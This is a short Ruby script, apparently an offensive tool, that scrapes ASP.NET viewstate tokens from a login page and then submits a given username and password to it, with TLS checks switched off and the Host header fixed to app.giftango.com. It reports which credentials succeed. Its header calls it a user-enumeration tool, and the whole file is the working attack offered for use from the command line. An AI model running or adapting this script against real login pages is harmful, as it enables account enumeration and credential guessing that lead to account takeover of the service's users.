#
# This script could be used for user enumeration, a valid viewstate was needed
# so its starts with an empty call first to get valid viewstate then uses it in a second 
# viewstate call
# 
# Created April 2015  
#

require 'nokogiri'
require 'uri'
require 'net/https'
require 'openssl'
require 'cgi'
require 'getopt/long'



class EmptyCall 
	def initialize(urlstring, user, pass)
		@user = user
		@pass = pass
		uri = URI.parse(urlstring)
		http = Net::HTTP.new(uri.host,443)
		request = Net::HTTP::Get.new(uri.request_uri)
		http.use_ssl = true
		http.verify_mode = OpenSSL::SSL::VERIFY_NONE 
		response = http.request(request) 
		doc = Nokogiri::HTML(response.body)
		doc.css('input').each do | i | 
			case i['name']
				when '__VIEWSTATE'
					@viewstate = i['value']
				when '__VIEWSTATEGENERATOR'
					@viewgen = i['value']
				
				when '__EVENTVALIDATION'
					@viewvalid = i['value']
			end
		
		end

		#puts "Values State #{@viewstate} and viewgen #{@viewgen} and valid is #{@viewvalid} "
		puts "\033[0;33mSubmitting Request...\033[0;00m"
		Submit.new(urlstring,@viewstate,@viewgen,@viewvalid,@user,@pass)
		end 

end 

		
class Submit
	def initialize(urlstring, viewstate,viewgenerator,viewvalid,user='',pass='')
	
		@urlstring = urlstring
		@user = user
		@pass = pass
		uri = URI.parse(@urlstring)
		http = Net::HTTP.new(uri.host,443)
		request = Net::HTTP::Post.new(uri.request_uri)
		request["Host"] = "app.giftango.com"
		request["User-Agent"] ="Mozilla/5.0"
		request["Connection"] = "keep-alive"
		request["Content-Type"] = "application/x-www-form-urlencoded"
		request["Cookie"] = ""
		request.set_form_data({"__VIEWSTATE" => viewstate,"__VIEWSTATEGENERATOR" => viewgenerator, "__EVENTVALIDATION" => viewvalid, "UserName" => @user, "Password" => @pass, "LoginButton" => "Log+In"})
		http.use_ssl = true
		http.verify_mode = OpenSSL::SSL::VERIFY_NONE
		http.read_timeout = 100
		#http.set_debug_output $stdout
	
		response = http.request(request)
	
		if response['Location'] == ''
			puts "\033[32mFound! [#{response.code}] with valid user #{@user} and password #{@pass}\033[0m"
		else 
			puts "Fail with user: #{@user}  and password: #{@pass} [#{response.code}]"
		end 




 
	end
end 
def getargs
	if ARGV.length == 0 
		exit 0 
	end 
	include Getopt
	opt = Long.getopts(
			["--user", '-u', REQUIRED],
			["--pass", '-p', REQUIRED]
			)
	return opt
end 


options = getargs 

EmptyCall.new("",options["user"],options["pass"]) 
		


#End Program 
